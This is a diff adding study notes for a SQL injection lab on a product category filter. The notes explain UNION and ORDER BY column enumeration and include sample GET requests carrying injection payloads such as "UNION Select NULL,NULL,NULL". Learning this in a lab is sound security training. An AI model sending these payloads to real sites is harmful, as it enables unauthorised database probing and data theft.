@@ -1,0 +1,30 @@
+SQli - Product Category filter
+
+End Goal: Determine the number of columns returned by the query
+
+backgrounf (Union):
+- The number and the order of the columns must be the same on all queries
+- The data types must be compatible
+
+SQLi attack: (way 1)
+We want to find out the number of columns ?
+
+Select ? from table1 Union Select NULL
+if error -> we know the column number is not 1
+No error we figured out the column number
+
+Select ? from table1 Union Select NULL, NULL
+if error -> we know the column number is more than 2
+no error we figured out the column number
+
+SQLi attack: (way 2)
+
+Select ? from table1 order by 1 - No error so there is 1 column
+Select ? from table1 order by 2 - No error so there are 2 columns
+Select ? from table1 order by 3 - error, so there are 2 columns and no more
+
+
+GET /filter?category=Gifts HTTP/2
+GET /filter?category=Gifts' UNION Select NULL HTTP/2
+GET /filter?category=Gifts' UNION Select NULL,NULL,NULL / Because I see 3 columns in the Browser
+GET /filter?category=Gifts' ORDER BY 3-- HTTP/2 Also shown by order by
